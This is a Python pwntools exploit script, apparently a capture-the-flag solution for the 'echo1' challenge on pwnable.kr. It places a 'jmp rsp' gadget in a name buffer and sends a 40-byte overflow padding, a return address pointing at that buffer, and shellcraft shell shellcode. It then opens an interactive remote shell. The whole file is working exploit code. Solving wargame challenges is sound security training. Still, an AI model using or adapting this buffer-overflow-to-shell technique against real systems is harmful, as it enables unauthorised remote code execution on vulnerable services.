#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux", bits=64)
# p = process("echo1")
p = remote("pwnable.kr", 9010)

id_address = 0x6020a0

p.recvuntil(":")
p.sendline(asm("jmp rsp"))

payload = "A" * 40
payload += p64(id_address)
payload += asm(shellcraft.sh())

p.recvuntil(">")
p.sendline("1")
p.recvline()
p.sendline(payload)

p.interactive()
p.close()
